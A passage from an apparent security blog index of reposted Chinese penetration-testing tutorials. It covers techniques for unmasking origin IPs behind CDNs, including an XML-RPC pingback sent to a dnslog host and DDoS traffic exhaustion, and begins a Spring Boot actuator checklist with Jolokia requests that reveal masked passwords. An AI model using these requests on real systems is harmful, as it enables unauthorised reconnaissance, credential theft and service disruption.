opt.write(con)  3.Layer 子域名挖掘机\n项目地址：https://hub.fastgit.org/euphrat1ca/LayerDomainFinder/releases/tag/3\nSeay 法师的作品，很早就有了，非常强大的一款 windows 上的 GUI 图形化工具，经历了数个版本的迭代，官方最新版是5.0，当然还有不计其数的网友自定义修改版本在野流传。\n4.Xray\n项目地址：https://github.com/chaitin/xray\nxray 是一款强大的安全评估工具，一款自动化扫描器，我们可以用其自带的 subdomain 子域名发掘功能来针对性探测：\nsubdomain 功能支持暴力破解模式和非暴力模式，可以只探测 web 服务或者只探测 ip 可解析的子域，另外支持 webhook 数据传递，作为插件端或者分发消息的接收端来使用都非常方便快捷。\n5.Bypass-firewalls-by-DNS-history\n项目地址：https://github.com/vincentcox/bypass-firewalls-by-DNS-history\nBypass-firewalls-by-DNS-history 是一款集成全自动化的探测工具，通过探测 DNS 历史记录，搜索旧的 DNS A Record，收集子域，并检查服务器是否对该域名进行答复。 另外它还基于源服务器和防火墙在HTML响应中的相似性阈值来判断。\n用法：\nbash bypass-firewalls-by-DNS-history.sh -d example.com -d --domain: domain to bypass -o --outputfile: output file with IP's -l --listsubdomains: list with subdomains for extra coverage -a --checkall: Check all subdomains for a WAF bypass  此外，类似的还有 subfinder 、dnsprobe 等等工具，有兴趣的读者可以自行去研究了解其工作原理和机制。\n二、通过 Email 邮局 一般大型网站自己部署架设的邮件服务器如果向外部用户发送邮件的话，如果中间未经任何数据处理和防护措施，那么邮件头部的源码中会包含此邮件服务器的真实 IP 地址。常见的邮件触发点有：\n RSS 订阅 邮箱注册、激活处 邮箱找回密码处 产品更新的邮件推送 某业务执行后发送的邮件通知 员工邮箱、邮件管理平台等入口处的忘记密码  另外这里还有一个奇淫技巧，通过发送邮件给一个不存在的邮箱地址，比如 000xxx@domain.com ，因为该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实 IP 通知。\n生产上多关注这些点，一个不成功继续测试下一个邮件触发点，很多大型网站的邮件服务器不止一台，并不是所有都做了防护处理，细节决定成败。\n三、通过 SSL 证书  证书颁发机构 (CA) 必须将他们发布的每个 SSL/TLS 证书发布到公共日志中，SSL/TLS 证书通常包含域名、子域名和电子邮件地址。因此可以利用 SSL/TLS 证书来发现目标站点的真实 IP 地址。 CDN 运营商在给服务器提供保护的同时，也会与其服务器进行加密通信（ssl），这时当服务器的 443 端口接入域名时也会在 443 端口暴露其证书，我们通过证书比对便可发现网站的真实 IP 地址。  1.利用 Censys 引擎（https://censys.io/）  Censys 搜索引擎能够扫描整个互联网，每天都会扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，可以利用 Censys 进行全网方面的 SSL 证书搜索，找到匹配的真实 IP 。  可以看到，当我们针对一个互联网 IP 地址进行搜索时，是有匹配到证书 sha1 签名的\n同理，我们根据域名指纹搜索 SSL 证书指纹，然后再反查 IP 就可以了。\n首先针对目标域名，选择 Certificates 证书搜索，结果出来一堆 有效 的证书和 无效  的证书：\n测试过程中，很容易陷入思维误区，认为 有效 的证书才是我们需要的，但其实并不一定，很多服务器配置错误依然保留的是 无效 的证书，就比如例子中，在结果特别多的情况下，我又使用 Censys 的语法搜索，来精准定位 有效 SSL 证书，减少结果：\nparsed.names: xxx.com and tags.raw: trusted  瞬间减少到了 2 个结果，我们逐个点开，然后 sha1 签名反查 IPV4 主机：\n不过很遗憾，两条记录全都没查到：\n这也从侧面说明了，不是所有的网站只有其 有效 证书会匹配其 IP 服务器。\n于是只能回到最开始，从所有的结果里面依次打开往下反查指纹，最终定位到了真实 IP ：\n安全不仅是个技术活，也是个细心活。\n2.使用命令行  通过 openssl 和 curl 等常见的基础命令，也同样可以达到反查 SSL 证书的效果。  openssl：\nopenssl s_client -connect 123.123.123.123:443 | grep subject  curl：\ncurl -v https://123.123.123.123 | grep 'subject'  3.使用工具和脚本  通过自己写工具脚本，集成前面的1、2两点，完全可以做到一个简易版的 SSL 全网证书爬取，也可以利用现有的一些脚本工具和网站，省的我们自己费力了。  例如 CloudFlair ，项目地址：https://github.com/christophetd/CloudFlair\n脚本兼容 python2.7 和 3.5，需要配置 Censys API，不过只针对目标网站是否使用 CloudFlare 服务进行探测。\n在 Censys 注册一个账号并进入 https://censys.io/account/api 获取 API ID 和 Secret：\n将 CloudFlair 克隆到本地并把 API ID 和 Secret 导入环境变量：\n$ git clone https://github.com/christophetd/CloudFlair $ export CENSYS_API_ID=\u0026quot;xxx\u0026quot; $ export CENSYS_API_SECRET=\u0026quot;xxx\u0026quot;  通过 requirements.txt 安装依赖：\n$ pip install -r requirements.txt  运行 cloudflair.py ：\n$ python cloudflair.py --censys-api-id xxx --censys-api-secret xxx baidu.com [*] The target appears to be behind CloudFlare. [*] Looking for certificates matching \u0026quot;myvulnerable.site\u0026quot; using Censys [*] 75 certificates matching \u0026quot;myvulnerable.site\u0026quot; found. [*] Looking for IPv4 hosts presenting these certificates... [*] 10 IPv4 hosts presenting a certificate issued to \u0026quot;myvulnerable.site\u0026quot; were found. - 51.194.77.1 - 223.172.21.75 - 18.136.111.24 - 127.200.220.231 - 177.67.208.72 - 137.67.239.174 - 182.102.141.194 - 8.154.231.164 - 37.184.84.44 - 78.25.205.83 [*] Retrieving target homepage at https://myvulnerable.site [*] Testing candidate origin servers - 51.194.77.1 - 223.172.21.75 - 18.136.111.24 responded with an unexpected HTTP status code 404 - 127.200.220.231 timed out after 3 seconds - 177.67.208.72 - 137.67.239.174 - 182.102.141.194 - 8.154.231.164 - 37.184.84.44 - 78.25.205.83 [*] Found 2 likely origin servers of myvulnerable.site! - 177.67.208.72 (HTML content identical to myvulnerable.site) - 182.102.141.194 (HTML content identical to myvulnerable.site)  其实完全可以通过 Censys 提供的 API 自己集成一款简洁实用的全自动化探测脚本，如果后面我有时间写好了，会同步更新到这里的。\n######4.证书收集\n可以通过 https://crt.sh 进行快速证书查询收集\n附上查询的 python 小脚本：\nimport requests import re TIME_OUT = 60 def get_SSL(domain): domains = [] url = 'https://crt.sh/?q=%25.{}'.format(domain) response = requests.get(url,timeout=TIME_OUT) ssl = re.findall(\u0026quot;\u0026lt;TD\u0026gt;(.*?).{}\u0026lt;/TD\u0026gt;\u0026quot;.format(domain),response.text) for i in ssl: i += '.' + domain domains.append(i) print(domains) if __name__ == '__main__': get_SSL(\u0026quot;baidu.com\u0026quot;)  获得所有包含证书的子域：\n四、通过海外 DNS 查询  针对国内市场用户，大部分的 CDN 服务商并没有做海外市场的 CDN ，所以可以通过寻找小众、冷门的海外 DNS 查询，看是否能获得真实 IP 。  $ nslookup target.com \u0026lt;海外 DNS 地址\u0026gt;  也可以使用海外的超级ping类的平台在线多国家多地区测试，推荐 https://www.host-tracker.com/v3/check/ ，支持 140 多个地区的 ping 测试，另外支持针对某子域超长期的监控，通过邮件通知，简直太强大了。\n五、通过敏感文件泄露 包括但不限于：\n 服务器日志文件 探针文件，例如 phpinfo 网站备份压缩文件 .DS_Store .hg .git SVN Web.xml  字典非常重要，往往疏忽的点就在一台边缘服务器。\n六、通过变更的域名  很多网站在发展的过程中，会更换域名，比如京东以前的域名是 360buy.com ，后来斥巨资购买了 jd.com 。 网站在更换新域名时，如果将 CDN 部署到新的域名上，而之前的域名由于没过期，可能未使用 CDN，因此可以直接获得服务器 IP，所以，历史域名也是一个很重要的点。  七、 通过 APP 移动端应用  如果网站存在 APP ，可以通过抓包分析其 APP 的数据流量，看是否能找到网站真实 IP 地址，记得关注 APP 的历史版本，里面会有很多 surprise 。  八、通过 F5 LTM 解码  LTM 是将所有的应用请求分配到多个节点服务器上。提高业务的处理能力，也就是负载均衡。 当服务器使用 F5 LTM 做负载均衡时，通过对 set-cookie 关键字的解码，可以获取服务器真实 ip 地址。  例如：\nSet-Cookie: BIGipServerpool_9.29_5229=605532106.22012.0000   先把第一小节的十进制数，即 605532106 取出来 将其转为十六进制数 2417afca 接着从后至前，取四个字节出来： CA AF 17 24 最后依次转为十进制数 202.175.23.36，即是服务器的真实 ip 地址。  九、通过 CDN 标头特征值 很多网站启用 CDN 后，配置了拒绝直接访问真实 IP ，比如 CloudFlare 的提示：\n因此可以通过匹配特征标头的方法，去缩小范围，这里还是使用 Censys 查询：\n语法: \u0026lt;port\u0026gt;http.get.headers.server:\u0026lt;CDN特征\u0026gt; eg: 80.http.get.headers.server:cloudflare  针对整个互联网的搜索 IP 结果进一步匹配，比如通过 端口、地理位置、banner 特征、反查邮箱、联系方式等等信息，继续精确结果：\n十、通过 XML-RPC PINGBACK 通信  XML-RPC 是支持 WordPress 与其他系统之间通信的规范，它通过使用 HTTP 作为传输机制和 XML 作为编码机制来标准化这些通信过程。 在 WordPress 的早期版本中，默认情况下已关闭 XML-RPC，但是从3.5版本开始，默认情况下开启。 XML-RPC 支持 trackback 和 pingback。 虽然 WordPress 启用了 REST API 来代替 XML-RPC ，不过 XML-RPX 不会过时的，放心大胆的使用就好，虽然 XML-RPC 这个技术很老了，但依然可以通杀很多网站。  配置好 dnslog，POST 请求 XML-RPC：\nPOST /xmlrpc.php HTTP/1.1 Host: domain.com Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en,zh-CN;q=0.9,zh;q=0.8 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 323 \u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;pingback.ping\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;http://2vbis4.dnslog.cn\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/param\u0026gt; \u0026lt;param\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;https://domain.com/\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/param\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt;  响应：\n刷新一下 dnslog ，获得了真实服务器 IP：\n十一、通过 FTP/SCP 协议  在很多情况下，网站需要将数据流从外部传输到内部服务器上，最安全的做法肯定是在用户和服务器之间建立虚拟专用网络（V*P+N 防和谐）。 但实际上，仍然有大量可从外部访问的 FTP / SCP 服务，从而容易被抓住机会找到源 IP 地址。  十二、利用 Websocket 协议  CloudFlare 等 CDN 服务商其实早就支持对 Websocket 的保护了，但太多的站长，不管大站小站，他们很多人都不知道，或者没有针对 Websocket 进行部署。 另一种原因是因为业务上的需求，毕竟 Websocket 要求客户端和服务器之间保持长久的连接，所以很有可能没有进行 CDN 部署。  十三、通过社会工程学  凯伦·王，21世纪初杰出初思想家、哲学家、社会学家、经济学家，社会工程学的鼻祖，括弧，自称的。 http://www.333ttt.com/up/up2103510950.html，熟悉的 BGM 响起来，好似又回到了辣一段青葱岁月。 估计有人笑了，不过啊，可真别小看社工的威力，有多少大厂、运营商是倒在了社会工程学脚下的，邮件钓鱼、水坑攻击、物理社工、身份伪装、客服欺骗、商务咨询 等等，案例数不胜数，不胜枚举。 因为人不是机器，只要是人，那就一定存在漏洞。 哦对，顺带推荐部电影，小李子的《猫鼠游戏》。  十四、通过网站漏洞  如果目标网站本身存在漏洞的话，比如 SSRF、XXE、XSS、文件上传、命令执行等漏洞，或者我们找到的其他突破口，注入我们自己的带外服务器地址，然后在服务器上检查 HTTP 日志记录。 应用本身的错误会造成当传递一些错误的参数值或者错误的地址时，内部会抛出异常，也就是日常所说的报错，关注报错点，经常会泄露一些真实的 IP 地址或者内网 IP 段。  十五、通过全网扫描  什么年代了啊，怎么还在说全网扫描。为了写全方法，这里还是提一下。 首先从 apnic 网络信息中心 或 IPdeny 获取目标地区 ip 段。 接着使用 Zmap、masscan 等工具对扫描出来端口开放的主机进行 banner 爬取。 然后在 http-req 的 Host 字段，写入我们需要寻找的子域。 最后过滤特征，确认是否有对应的服务器响应。 哦对了，如果端口不是常见或者固定，当场退役。 实际上，全网扫描的方法十分笨重，不推荐。因为已经有很多的网站给我们提供了全网爬取服务，之前的方法里都有介绍到，何必自己全网扫描呢，受限于网络、受限于设备，你个人爬的数据能有人家商业爬的全吗？  十六、通过 virtual-host 碰撞  当我们收集了目标足够多的可能的真实 IP 时，可以通过 IP 和子域的碰撞，来批量获得命中目标以及目标哪些的子域。  IP 正确，子域错误：\nIP 正确，子域正确：\nIP 错误，子域正确：\n自动化的过程可以使用 virtual-host-discovery 工具，项目地址：https://github.com/jobertabma/virtual-host-discovery\n克隆到本地\n$ git clone https://github.com/jobertabma/virtual-host-discovery  使用方法：\n$ ruby scan.rb --ip=x.x.x.x --host=domain --wordlist=\u0026lt;dict file\u0026gt;  其中wordlsit 参数可以省略，默认有一个字典加载，使用该参数则是指定我们自己想要跑的子域列表。\n执行后，即可快速找出命中 IP 的子域\n另外可以通过 find-virtual-hosts （https://pentest-tools.com/information-gathering/find-virtual-hosts#）工具来在线快速针对全网数据扫描比对得出结果：\n十七、通过 favicon.ico 哈希特征  favicon.ico 是现代浏览器在网页标题的左侧显示的一个小图标。 该图标数据通常是从 https://anywebsite/favicon.ico 处获取的，浏览器会在浏览任何网站时自动请求它。 因为可以通过计算 favicon.ico 的指纹哈希，然后去 shodan 等搜索引擎搜索与之相同的主机结果，从而进一步探测是否能挖掘出目标网站的真实 IP 地址。  计算 favicon.ico 哈希的小脚本：\npython 2\nimport mmh3 import requests response = requests.get('https://domain.com/favicon.ico') favicon = response.content.encode('base64') hash = mmh3.hash(favicon) print hash  python 3\nimport mmh3 import requests import codecs response = requests.get('https://domain.com/favicon.ico') favicon = codecs.encode(response.content,\u0026quot;base64\u0026quot;) hash = mmh3.hash(favicon) print(hash)  安装好环境依赖后执行脚本，计算得到目标网站的 favicon.ico 哈希值：\n$ apt-get install build-essential $ apt-get install gcc $ apt-get install g++ $ python 3.py  然后用 shodan 搜索引擎搜索哈希，去命中 IP：\n$ proxychains shodan search http.favicon.hash:1730752770 --fields ip_str,port --separator \u0026quot; \u0026quot; | awk '{print $1\u0026quot;:  另外值得一提的是，渗透过程中同样可以根据 favicon 哈希、子域、IP 的命中，做好指纹排序并整理，另外做一张常见的中间件或者组件指纹哈希表，分类进行资产快速命中：\n十八、通过网页源码特征值  在服务器源 IP 地址允许访问并且返回的也是类似的网站内容情况下，可以通过侦察页面源码中 JS 、CSS 、HTML 等一系列静态特征值，然后用 Shodan 、Zoomeye 、Censys 等搜索引擎进行匹配搜索，从而定位 IP 。  例如源码中找到一段 Google Analytics 的 JS 特征：\n然后 shodan 搜索这些代码特征：\nhttp.html:UA-XXXXX-X http.html:GTM-XXXXXX  定位到了服务器源 IP ：\n十九、通过网站远程资源业务  多找一下目标网站上支持远程图片、远程文件等被动连接的业务地方，通过注入我们自己服务器的资源文件，然后查看 HTTP 日志来定位目标服务器的连接。 常见的比如加载远程头像处。  二十、通过 CDN 机器  有些网站是自搭建 CDN 机器做负载均衡的，很难保证每一台 CDN 机器都做到 100% 安全。没有办法的情况下，可以尝试针对这些 CDN 机器进行渗透测试，如果能拿下一台，就什么都有了，目标主站的安全性好并不代表所有的生产边路都不存在缺陷，安全不在于真正强的地方有多强，而在于薄弱的地方有多弱。  二十一、通过流量耗尽、流量放大攻击  CDN 是收费的，那么其流量一定是有限的，对一些不是超大型目标网站在进行测试时，注意，一定要在项目方授权允许的情况下，可以尝试进行 ddos 流量测试。 CDN 流量耗尽了，就不存在内容分发了，直接就可以拿到源 IP 。 但是，CDN 是流量穿透的，别流量耗尽前，目标网站先 gg 了。 另一种比较古老的做法是通过 CDN 设置中的自身缺陷，将要保护的源站 IP 设置成为 CDN 节点的地址，致使 CDN 流量进入死循环，一层层放大后，最终自己打死自己。不过大多数的 CDN 厂商早已限制禁止将 CDN 节点设置成 CDN 节点 IP ，并且启用了自动丢包保护机制。  二十二、通过域名备案信息广域探测  针对目标域名，目标二级域名，如果都做了 CDN 的情况下，是不是就思路中断了呢？ 肯定不是。这里分享一个很少有人去关注的独门秘技。 网站需要服务器，但是再土豪的公司，也不可能一个域名一台服务器，大多数情况下，都是多个域名业务，共用一台服务器。 那么如果目标网站存在备案，可以查询其备案信息，收集该单位或者个人备案的其他网站域名以及其他子域，然后再进行一轮广域的探测，很有可能其中的某个边缘子域，没有做 CDN，就直接暴露了真实服务器的 IP 地址，然后再进一步验证该 IP 是否也是目标网站的真实 IP 。   特别提一哈，此方法成功率特别的高，而且找到的速度非常的快，所以写在后面，有毅力坚持读下来的同学可以看到。  二十三、利用 CDN 服务商默认配置  不同的 CDN 服务商，产品默认配置不同。 例如 CloudFlare ，默认配置 direct.domain.com 二级子域指向服务器源 IP。但是很多公司或者个人使用 CDN 保护的时候并没有修改默认配置，导致 IP 泄露风险。 其他一些高风险的子域如 ftp、mail、cpanel、direct-connect 等也可以重点关注，方便快速定位，毕竟众测里时间就是金钱。  二十四、通过 SSH 指纹  跑题了，SSH 指纹一般应用于匿名 Tor 网络追踪  二十五、使用 CloudFair 工具  如果你的目标是 CloudFlare 保护的，建议先上这款工具跑。 CloudFail 是一种战术侦察工具，旨在收集有关受 Cloudflare 保护的目标的足够信息，以期发现服务器的 IP 位置。  该工具目前探测经过3个不同的攻击阶段：\n1.使用 DNSDumpster.com 扫描 DNS 配置错误。 2.扫描和比对 Crimeflare.com 数据库。 3.内置字典暴力扫描超过11000个子域名。\n安装和使用：\n$ git clone https://github.com/m0rtem/CloudFail $ pip install -r requirements.txt $ python cloudfail.py -t domain.com ____ _ _ _____ _ _ / ___| | ___ _ _ __| | ___|_ _(_) | | | | |/ _ \\| | | |/ _` | |_ / _` | | | | |___| | (_) | |_| | (_| | _| (_| | | | \\____|_|\\___/ \\__,_|\\__,_|_| \\__,_|_|_| v1.0.2 by m0rtem [16:12:31] Initializing CloudFail - the date is: 07/01/2021 [16:12:31] Fetching initial information from: domain.com... [16:12:31] Server IP: 104.xx.x.76 [16:12:31] Testing if domain.com is on the Cloudflare network... [16:12:31] domain.com is part of the Cloudflare network! [16:12:31] Testing for misconfigured DNS using dnsdumpster... [16:12:35] [FOUND:HOST] domain.com HTTP: cloudflare TCP8080: cloudflare 172.xx.xx.62 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] freelance.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] www.freelance.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] ctf.domain.com HTTP: nginx/1.10.3 HTTPS: nginx/1.10.3 SSH: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7 185.231.245.55 TEAM-HOST AS Russia [16:12:35] [FOUND:HOST] www.ctf.domain.com HTTP: nginx/1.10.3 HTTPS: nginx/1.10.3 SSH: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7 185.231.245.55 TEAM-HOST AS Russia [16:12:35] [FOUND:HOST] mail.domain.com 62.213.11.246 ROSTELECOM-ASRussia Russia [16:12:35] [FOUND:HOST] school.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] www.school.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] pentest.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] www.pentest.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] w.domain.com HTTP: nginx/1.6.2 HTTPS: nginx/1.6.2 SSH: SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u8 185.xx.xx.136 TEAM-HOST AS Russia [16:12:35] [FOUND:HOST] www.w.domain.com HTTP: nginx/1.6.2 HTTPS: nginx/1.6.2 SSH: SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u8 185.xx.xx.136 TEAM-HOST AS Russia [16:12:35] [FOUND:HOST] www.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] pay.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:HOST] www.pay.domain.com HTTP: cloudflare TCP8080: cloudflare 104.xx.xx.76 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:DNS] tim.ns.cloudflare.com. 173.xx.xx.145 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:DNS] tina.ns.cloudflare.com. 173.xx.xx.230 CLOUDFLARENETUnited States United States [16:12:35] [FOUND:MX] 62.xx.xx.246 ROSTELECOM-ASRussia 10 mail.domain.com. [16:12:35] [FOUND:MX] 62.xx.xx.246 ROSTELECOM-ASRussia 20 mail.domain.com. [16:12:35] Scanning crimeflare database... [16:12:36] [FOUND:IP] 62.xx.xx.230 [16:12:36] [FOUND:IP] 62.xx.xx.246 [16:12:36] Scanning 11219 subdomains (subdomains.txt), please wait... [16:15:52] [FOUND:SUBDOMAIN] mail.domain.com IP: 62.xx.xx.246 HTTP: 200 [16:16:13] [FOUND:SUBDOMAIN] pay.domain.com ON CLOUDFLARE NETWORK! [16:16:35] [FOUND:SUBDOMAIN] school.domain.com ON CLOUDFLARE NETWORK! [16:17:03] [FOUND:SUBDOMAIN] w.domain.com IP: 185.xx.xx.136 HTTP: 200 [16:17:10] [FOUND:SUBDOMAIN] www.domain.com ON CLOUDFLARE NETWORK! [16:17:14] Scanning finished...  闭眼休息一会，一会就跑出来了：\n喜欢偷懒的同学可以使用在线查询：https://suip.biz/?act=cloudfail 已经将此工具集成到了后台，并做了前端 UI 页面供安全信息从业人员在线查询：\n脚本执行的结果前端直接可以看到，另外提供 PDF 报告下载，这里我用的是 baidu.com 测试，因为 baidu.com 并没有使用 CloudFlare CDN ，所以速度很快。\n如果是查询使用了 CloudFlare CDN 的域名，速度会比较慢，页面会置空，什么都不显示：\n稍等一段时间就可以了，这里也给大家截个图，防止有同学误会工具不可以使用：\n0x05 找到真实 IP 后如何使用  通过修改 hosts 文件，将域名和 IP 绑定。（要是不会，不建议阅读此文。） 如使用 burpsuite 测试，可以在 Project options \u0026mdash;-\u0026gt; Connections \u0026mdash;-\u0026gt; Hostname Resolution 中增加域名和 IP 记录。  0x06 来自高纬度的对抗  协议层的管制 / 动静态表 / 出口阻断 / 并发机制转换 / 编码放大 …… 等等高纬度对抗的内容，将在（二）中细细道来。（未完待续）  ","id":18,"section":"posts","summary":"文章转载安全客，源地址：https://www.anquanke.com/post/id/227818 这是一篇全网（无论国内还是国外）最全、","tags":["信息收集"],"title":"CDN 2021 完全攻击指南 （一）","uri":"https://ad-calcium.github.io/2021/12/cdn-2021-%E5%AE%8C%E5%85%A8%E6%94%BB%E5%87%BB%E6%8C%87%E5%8D%97%E4%B8%80/","year":"2021"},{"content":"Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list\n文章转载至：https://github.com/LandGrey/SpringBootVulExploit\n零：路由和版本 0x01：路由知识  有些程序员会自定义 /manage、/management 、项目 App 相关名称为 spring 根路径 Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 / ，2.x 版本则统一以 /actuator 为起始路径 Spring Boot Actuator 默认的内置路由名字，如 /env 有时候也会被程序员修改，比如修改成 /appenv  0x02：版本知识  Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。\n 组件版本的相互依赖关系：    依赖项 版本列表及依赖组件版本     spring-boot-starter-parent spring-boot-starter-parent   spring-boot-dependencies spring-boot-dependencies   spring-cloud-dependencies spring-cloud-dependencies    Spring Cloud 与 Spring Boot 版本之间的依赖关系：    Spring Cloud 大版本 Spring Boot 版本     Angel 兼容 Spring Boot 1.2.x   Brixton 兼容 Spring Boot 1.3.x、1.4.x   Camden 兼容 Spring Boot 1.4.x、1.5.x   Dalston 兼容 Spring Boot 1.5.x，不兼容 2.0.x   Edgware 兼容 Spring Boot 1.5.x，不兼容 2.0.x   Finchley 兼容 Spring Boot 2.0.x，不兼容 1.5.x   Greenwich 兼容 Spring Boot 2.1.x   Hoxton 兼容 Spring Boot 2.2.x    Spring Cloud 小版本号的后缀及含义:    小版本号后缀 含义     BUILD-SNAPSHOT 快照版，代码不是固定，处于变化之中   MX 里程碑版   RCX 候选发布版   RELEASE 正式发布版   SRX (修复错误和 bug 并再次发布的)正式发布版    一：信息泄露 0x01：路由地址及接口调用详情泄漏  开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等\n 直接访问以下两个 swagger 相关路由，验证漏洞是否存在：\n/v2/api-docs /swagger-ui.html  其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：\n/swagger /api-docs /api.html /swagger-ui /swagger/codes /api/index.html /api/v2/api-docs /v2/swagger.json /swagger-ui/html /distv2/index.html /swagger/index.html /sw/swagger-ui.html /api/swagger-ui.html /static/swagger.json /user/swagger-ui.html /swagger-ui/index.html /swagger-dubbo/api-docs /template/swagger-ui.html /swagger/static/index.html /dubbo-provider/distv2/index.html /spring-security-rest/api/swagger-ui.html /spring-security-oauth-resource/swagger-ui.html  除此之外，下面的 spring boot actuator 相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：\n/mappings /metrics /beans /configprops /actuator/metrics /actuator/mappings /actuator/beans /actuator/configprops  一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞，但是以 \u0026ldquo;默认安全\u0026rdquo; 来讲，不暴露出这些信息更加安全。\n对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。\n0x02：配置不当而暴露的路由  主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置\n 参考 production-ready-endpoints 和 spring-boot.txt，可能因为配置不当而暴露的默认内置路由可能会有：\n/actuator /auditevents /autoconfig /beans /caches /conditions /configprops /docs /dump /env /flyway /health /heapdump /httptrace /info /intergrationgraph /jolokia /logfile /loggers /liquibase /metrics /mappings /prometheus /refresh /scheduledtasks /sessions /shutdown /trace /threaddump /actuator/auditevents /actuator/beans /actuator/health /actuator/conditions /actuator/configprops /actuator/env /actuator/info /actuator/loggers /actuator/heapdump /actuator/threaddump /actuator/metrics /actuator/scheduledtasks /actuator/httptrace /actuator/mappings /actuator/jolokia /actuator/hystrix.stream  其中对寻找漏洞比较重要接口的有：\n  /env、/actuator/env\nGET 请求 /env 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；\n同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。\n  /refresh、/actuator/refresh\nPOST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新属性变量来触发相关 RCE 漏洞。\n  /restart、/actuator/restart\n暴露出此接口的情况较少；可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞。\n  /jolokia、/actuator/jolokia\n可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。\n  /trace、/actuator/httptrace\n一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。\n  0x03：获取被星号脱敏的密码的明文 (方法一)  访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果\n 利用条件：  目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知）  利用方法： 步骤一： 找到想要获取的属性名 GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： jolokia 调用相关 Mbean 获取明文 将下面示例中的 security.user.password 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 value 键中。\n 调用 org.springframework.boot Mbean   实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法\n spring 1.x\nPOST /jolokia Content-Type: application/json {\u0026quot;mbean\u0026quot;: \u0026quot;org.springframework.boot:name=SpringApplication,type=Admin\u0026quot;,\u0026quot;operation\u0026quot;: \u0026quot;getProperty\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;EXEC\u0026quot;, \u0026quot;arguments\u0026quot;: [\u0026quot;security.user.password\u0026quot;]}  spring 2.x\nPOST /actuator/jolokia Content-Type: application/json {\u0026quot;mbean\u0026quot;: \u0026quot;org.springframework.boot:name=SpringApplication,type=Admin\u0026quot;,\u0026quot;operation\u0026quot;: \u0026quot;getProperty\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;EXEC\u0026quot;, \u0026quot;arguments\u0026quot;: [\u0026quot;security.user.password\u0026quot;]}   调用 org.springframework.cloud.context.environment Mbean   实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法\n spring 